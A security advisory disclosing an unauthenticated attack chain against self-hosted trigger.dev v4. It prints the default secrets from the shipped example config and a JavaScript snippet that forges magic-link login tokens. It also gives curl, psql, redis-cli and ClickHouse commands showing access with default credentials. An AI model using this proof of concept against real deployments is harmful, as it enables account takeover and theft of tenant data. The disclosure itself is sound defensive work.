# GHSA-pqxw-g93w-hj9x

*Canonical version: <https://sfwani.github.io/advisories/ghsa-pqxw-g93w-hj9x/>*

**Self-Hosted Deployment: Default Secrets allow Unauthenticated Infrastructure Compromise**

| | |
|:--|:--|
| Advisory | [GHSA-pqxw-g93w-hj9x](https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-pqxw-g93w-hj9x) |
| CVE | not assigned |
| Severity | High (no CVSS score published) |
| CVSS vector | `not published` |
| CWE | CWE-653 (Improper Isolation or Compartmentalization), CWE-1393 (Use of Default Password) |
| Published | 2026-07-21 |

### Affected versions

| Package | Ecosystem | Vulnerable | Fixed in |
|:--|:--|:--|:--|
| `trigger.dev` | npm | <= 4.5.5 | n/a |

## Details

## Summary

Self-hosted trigger.dev v4 instances deployed using the provided Docker Compose configuration with default secrets from `hosting/docker/.env.example` are vulnerable to a multi-stage unauthenticated attack chain leading to complete infrastructure compromise.

## Vulnerability Details

The `hosting/docker/.env.example` file contains hardcoded cryptographic secrets:

```
SESSION_SECRET=2818143646516f6fffd707b36f334bbb
MAGIC_LINK_SECRET=44da78b7bbb0dfe709cf38931d25dcdd
ENCRYPTION_KEY=f686147ab967943ebbe9ed3b496e465a
MANAGED_WORKER_SECRET=447c29678f9eaf289e9c4b70d3dd8a7f
```

The `MAGIC_LINK_SECRET` is used by `remix-auth-email-link@2.0.2` to create authentication tokens via CryptoJS AES encryption. An attacker who knows this secret can forge valid magic links that authenticate as any email address without email delivery. The `validateSessionMagicLink` option defaults to `false` in the library (never overridden by trigger.dev), so no session-side validation occurs. User accounts are auto-created when `WHITELISTED_EMAILS` is not set (the default for self-hosted).

## Steps to Reproduce

### Setup
```bash
cd hosting/docker && cp .env.example .env
cd webapp && docker compose up -d
cd ../worker && docker compose up -d
```

### Step 1: Forge magic link token
```javascript
const CryptoJS = require('crypto-js');
const secret = '44da78b7bbb0dfe709cf38931d25dcdd';
const payload = JSON.stringify({e: 'attacker@evil.com', c: Date.now()});
const token = encodeURIComponent(CryptoJS.AES.encrypt(payload, secret).toString());
console.log('https://target:8030/magic?token=' + token);
```

### Step 2: Authenticate via forged magic link
```bash
curl -v "http://localhost:8030/magic?token="
# Returns: HTTP 302, set-cookie: __session=eyJ1c2VyIjp7InVzZXJJZCI6ImNtcGg3OTBxZjAwMDR0bjU1ZWM3bHlxN2EifX0=...
# User auto-created, session cookie set, redirects to /orgs/new
```

### Step 3: Verify database access from runner network
```bash
docker run --rm --network webapp postgres:14 psql "postgresql://postgres:unsafe-postgres-pw@postgres:5432/main" -c "SELECT id, email FROM \"User\";"
# Returns: cmph790qf0004tn55ec7lyq7a | attacker@evil.com
```

### Step 4: Verify Redis access (no auth)
```bash
docker run --rm --network webapp redis:7 redis-cli -h redis PING
# Returns: PONG
```

### Step 5: Verify ClickHouse access
```bash
docker run --rm --network webapp curlimages/curl curl -s "http://default:password@clickhouse:8123/?query=SELECT%20version()"
# Returns: 25.5.2.47
```

## Root Cause

1. Hardcoded secrets in `hosting/docker/.env.example` (lines 9-12)
2. Runner containers placed on infrastructure networks: `DOCKER_RUNNER_NETWORKS: webapp,supervisor` in `hosting/docker/worker/docker-compose.yml:42`
3. Default credentials on all infrastructure services
4. No Redis authentication
5. SESSION_SECRET reused for JWT signing (`apps/webapp/app/services/apiAuth.server.ts:616`) and impersonation tokens

## Impact

Complete infrastructure compromise: all tenant data, API keys, encrypted secrets (decryptable with known ENCRYPTION_KEY), user accounts, cross-tenant access. Attacker can modify data, push backdoored Docker images to the registry, and manipulate job queues.
